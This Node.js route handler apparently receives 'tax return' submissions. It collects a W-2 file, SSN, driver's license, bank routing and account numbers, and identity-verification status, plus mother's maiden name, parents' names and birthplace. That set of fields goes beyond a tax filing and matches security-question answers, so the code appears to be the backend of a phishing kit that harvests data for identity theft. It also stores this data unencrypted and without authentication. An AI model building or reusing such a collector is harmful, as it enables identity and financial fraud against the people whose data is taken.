const multer = require('multer');
const upload = multer({ storage: multer.memoryStorage() });
const TaxReturn = require('../models/TaxReturn');
const { uploadFile } = require('../utils/cloudinary');

module.exports = async (req, res) => {
  const uploadMiddleware = upload.single('w2');

  uploadMiddleware(req, res, async (err) => {
    if (err) {
      return res.status(400).json({ error: 'File upload error: ' + err.message });
    }

    try {
      const {
        idmeVerified,
        idmeUserId,
        driversLicenseNumber,
        driversLicenseState,
        ssn,
        fathersName,
        mothersName,
        mothersMaidenName,
        birthCity,
        birthState,
        bankName,
        accountType,
        routingNumber,
        accountNumber,
      } = req.body;

      const requiredFields = {
        driversLicenseNumber,
        driversLicenseState,
        ssn,
        fathersName,
        mothersName,
        mothersMaidenName,
        birthCity,
        birthState,
        bankName,
        accountType,
        routingNumber,
        accountNumber,
      };
      for (const [key, value] of Object.entries(requiredFields)) {
        if (!value) {
          return res.status(400).json({ error: `Missing required field: ${key}` });
        }
      }

      if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) {
        return res.status(400).json({ error: 'Invalid SSN format (use XXX-XX-XXXX)' });
      }

      let w2Data = {};
      if (req.file) {
        if (process.env.CLOUDINARY_CLOUD_NAME) {
          try {
            const result = await uploadFile(req.file.buffer, req.file.originalname);
            w2Data = {
              filename: req.file.originalname,
              url: result.secure_url,
              publicId: result.public_id,
            };
          } catch (cloudErr) {
            console.error('Cloudinary upload failed, falling back to base64:', cloudErr);
            w2Data = {
              filename: req.file.originalname,
              data: req.file.buffer.toString('base64'),
              mimeType: req.file.mimetype,
            };
          }
        } else {
          w2Data = {
            filename: req.file.originalname,
            data: req.file.buffer.toString('base64'),
            mimeType: req.file.mimetype,
          };
        }
      }

      const taxReturn = new TaxReturn({
        idmeVerified: idmeVerified === 'true',
        idmeUserId: idmeUserId || '',
        driversLicense: {
          number: driversLicenseNumber,
          state: driversLicenseState,
        },
        ssn,
        w2: w2Data,
        fathersName,
        mothersName,
        mothersMaidenName,
        placeOfBirth: {
          city: birthCity,
          state: birthState,
        },
        bankInfo: {
          bankName,
          accountType,
          routingNumber,
          accountNumber,
        },
      });

      await taxReturn.save();
      res.status(201).json({ message: 'Tax return submitted successfully' });
    } catch (error) {
      console.error('Submission error:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });
};